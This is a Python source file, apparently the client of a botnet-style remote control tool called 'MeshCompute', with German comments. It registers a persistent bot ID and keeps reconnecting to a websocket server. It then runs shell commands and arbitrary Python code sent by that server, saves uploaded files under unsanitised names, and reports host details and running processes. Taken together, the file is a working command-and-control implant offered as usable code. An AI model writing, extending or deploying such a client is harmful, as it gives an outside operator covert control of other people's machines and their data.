import asyncio
import json
import uuid
import platform
import psutil
import logging
import shlex
import os
import socket
import base64
from pathlib import Path
from dotenv import load_dotenv
import websockets
from common.config import SERVER_URL, MAX_COMMAND_TIMEOUT

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ====================== BOT ID ======================
BOT_ID_FILE = "client/bot_id.txt"
if os.path.exists(BOT_ID_FILE):
    with open(BOT_ID_FILE, "r") as f:
        BOT_ID = f.read().strip()
else:
    BOT_ID = f"{socket.gethostname()}-{str(uuid.uuid4())[:8]}"
    os.makedirs("client", exist_ok=True)
    with open(BOT_ID_FILE, "w") as f:
        f.write(BOT_ID)

# ====================== HELPER FUNCTIONS ======================
async def get_system_info():
    return {
        "hostname": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "python": platform.python_version(),
        "cpu_cores": psutil.cpu_count(logical=False),
        "memory_gb": round(psutil.virtual_memory().total / (1024**3), 2),
        "username": os.getenv("USER") or os.getenv("USERNAME", "unknown"),
        "cwd": os.getcwd(),
        "bot_id": BOT_ID,
        "pid": os.getpid()
    }

async def execute_command(cmd: str, timeout=MAX_COMMAND_TIMEOUT):
    try:
        args = shlex.split(cmd)
        proc = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return {
                "success": proc.returncode == 0,
                "output": stdout.decode('utf-8', errors='replace'),
                "error": stderr.decode('utf-8', errors='replace'),
                "returncode": proc.returncode
            }
        except asyncio.TimeoutError:
            proc.kill()
            return {"success": False, "error": "Command timed out"}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ====================== MAIN ======================
async def main():
    print(f"🚀 MeshCompute Client gestartet → {BOT_ID}")

    while True:
        try:
            async with websockets.connect(SERVER_URL, ping_interval=20, ping_timeout=40) as ws:
                await ws.send(json.dumps({"type": "client", "bot_id": BOT_ID}))
                logger.info(f"✅ Verbunden als {BOT_ID}")

                async for raw_msg in ws:
                    try:
                        msg = json.loads(raw_msg)

                        # ====================== INTERACTIVE SHELL ======================
                        if msg.get("action") == "shell":
                            await ws.send(json.dumps({
                                "type": "shell_output",
                                "output": f"Shell gestartet auf {BOT_ID}\n",
                                "bot_id": BOT_ID
                            }))

                        elif msg.get("type") == "shell_input":
                            command = msg.get("command", "")
                            task_id = msg.get("task_id")

                            if command.lower() in ["exit", "quit"]:
                                await ws.send(json.dumps({
                                    "type": "shell_exit",
                                    "bot_id": BOT_ID,
                                    "task_id": task_id
                                }))
                                continue

                            # Befehl ausführen
                            result = await execute_command(command)
                            output = result.get("output", "")
                            if result.get("error"):
                                output += "\n" + result["error"]

                            await ws.send(json.dumps({
                                "type": "shell_output",
                                "output": output,
                                "bot_id": BOT_ID,
                                "task_id": task_id
                            }))

                        # ====================== FILE UPLOAD ======================
                        elif msg.get("type") == "file_upload":
                            filename = msg.get("filename")
                            content_b64 = msg.get("content")
                            task_id = msg.get("task_id")

                            try:
                                data = base64.b64decode(content_b64)
                                upload_dir = Path("uploads")
                                upload_dir.mkdir(exist_ok=True)
                                file_path = upload_dir / filename

                                with open(file_path, "wb") as f:
                                    f.write(data)

                                await ws.send(json.dumps({
                                    "type": "file_upload_done",
                                    "bot_id": BOT_ID,
                                    "task_id": task_id,
                                    "filename": filename,
                                    "path": str(file_path),
                                    "size": len(data)
                                }))
                                logger.info(f"📁 Datei gespeichert: {file_path}")
                            except Exception as e:
                                logger.error(f"Upload-Fehler: {e}")
                                await ws.send(json.dumps({
                                    "type": "file_upload_done",
                                    "bot_id": BOT_ID,
                                    "task_id": task_id,
                                    "error": str(e)
                                }))

                        # ====================== NORMALE COMMANDS ======================
                        elif "action" in msg:
                            action = msg["action"]
                            task_id = msg.get("task_id")
                            payload = msg.get("payload")
                            result = {
                                "type": "result",
                                "task_id": task_id,
                                "bot_id": BOT_ID,
                                "action": action
                            }

                            try:
                                if action == "exec":
                                    res = await execute_command(payload)
                                    result.update(res)
                                elif action == "sysinfo":
                                    result["success"] = True
                                    result["info"] = await get_system_info()
                                elif action == "python":
                                    exec_globals = {}
                                    exec(payload, exec_globals)
                                    result.update({
                                        "success": True,
                                        "output": str(exec_globals.get("output", "Code executed"))
                                    })
                                elif action == "ps":
                                    processes = [{"pid": p.info['pid'], "name": p.info['name']}
                                                for p in psutil.process_iter(['pid', 'name'])][:30]
                                    result.update({"success": True, "processes": processes})
                                elif action == "ping":
                                    result.update({"success": True, "message": "pong"})
                                else:
                                    result.update({"success": False, "error": f"Unbekannte Aktion: {action}"})
                            except Exception as e:
                                result.update({"success": False, "error": str(e)})

                            await ws.send(json.dumps(result))

                    except json.JSONDecodeError:
                        continue
                    except Exception as e:
                        logger.warning(f"Nachrichtenverarbeitungsfehler: {e}")

        except websockets.exceptions.ConnectionClosed:
            logger.warning("Verbindung zum Server verloren → Reconnect...")
            await asyncio.sleep(3)
        except Exception as e:
            logger.error(f"Verbindungsfehler: {e}")
            await asyncio.sleep(3)


if __name__ == "__main__":
    asyncio.run(main())